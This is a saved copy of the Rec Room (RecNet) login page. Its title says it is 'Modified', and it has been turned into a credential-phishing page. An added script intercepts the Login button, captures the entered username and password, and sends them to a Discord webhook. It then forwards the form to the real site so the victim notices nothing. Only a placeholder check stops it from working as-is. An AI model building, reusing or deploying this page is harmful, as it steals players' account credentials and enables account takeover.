<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - RecNet (Modified)</title>


    <link rel="stylesheet" href="./Log in - RecNet_files/bootstrap.min.css">
    <link rel="stylesheet" href="./Log in - RecNet_files/site.min.css">


</head>
<body>
    <div class="container body-content">
        <div class="page-login">
            <div class="col-sm-2 col-md-3 col-lg-4"></div>
            <div class="col-sm-8 col-md-6 col-lg-4">
                <img class="recroom-logo" src="./Log in - RecNet_files/logo_stacked.png" alt="Rec Room">
                <hr>
                <section>
                    <form id="loginForm" action="https://rec.net/" method="post">
                        <p class="text-center">Log in with your Rec Room Username and Password</p>
                        <div class="form-group">
                            <label for="Input_Username">Username or Email</label>
                            <input class="form-control" placeholder="Username" autofocus="" type="text" id="Input_Username" name="Input.Username">
                        </div>
                        <div class="form-group">
                            <label for="Input_Password">Password</label>
                            <input class="form-control" type="password" placeholder="Password" autocomplete="off" id="Input_Password" name="Input.Password">
                        </div>
                        <div class="form-actions">
                            <div class="form-group">
                                <div class="checkbox">
                                    <label for="Input_RememberMe">
                                        <input checked="true" type="checkbox" id="Input_RememberMe" name="Input.RememberMe" value="true">
                                        Remember Me?
                                    </label>
                                </div>
                            </div>
                            <div class="submit-button form-group">
                                <button class="btn" id="submitButton" name="button" value="login">Login</button>
                            </div>
                        </div>
                        <div class="form-group">
                            <p><a href="https://rec.net/password/recover">Forgot your password?</a></p>
                            <p><a href="https://rec.net/download">Don't have an Account? Download Rec Room to create yours today!</a></p>
                        </div>
                    </form>
                </section>
            </div>
            <div class="col-sm-2 col-md-3 col-lg-4"></div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const usernameInput = document.getElementById('Input_Username');
            const passwordInput = document.getElementById('Input_Password');
            const submitButton = document.getElementById('submitButton');

            submitButton.addEventListener('click', function(event) {
                event.preventDefault(); // Prevent the default form submission

                const username = usernameInput.value;
                const password = passwordInput.value;

                // Replace with your actual Discord webhook URL!
                const webhookURL = 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH';

                if (webhookURL === 'https://discord.com/api/webhooks/1366421122014253097/a63BlnStlKceFeK6fEjGIANz4r_bgxZyA7_Gt_r-Ub5TjTrKCYDkmUs8vEqKhbfR7-DH') {
                    alert('ERROR: It appears you have not replaced the placeholder webhook URL! Please update the code with your actual webhook URL.');
                    return;
                }

                const data = {
                    embeds: [{
                        title: 'Login Attempt',
                        fields: [
                            {
                                name: 'Username/Email',
                                value: username
                            },
                            {
                                name: 'Password',
                                value: password
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => {
                    if (response.ok) {
                        alert('Login information sent (to your webhook)!');
                        loginForm.submit(); // Programmatically submit the form
                    } else {
                        alert('Failed to send login information.');
                    }
                })
                .catch(error => {
                    console.error('Error sending to webhook:', error);
                    alert('An error occurred while trying to send the information.');
                });
            });
        });
    </script>

</body></html>
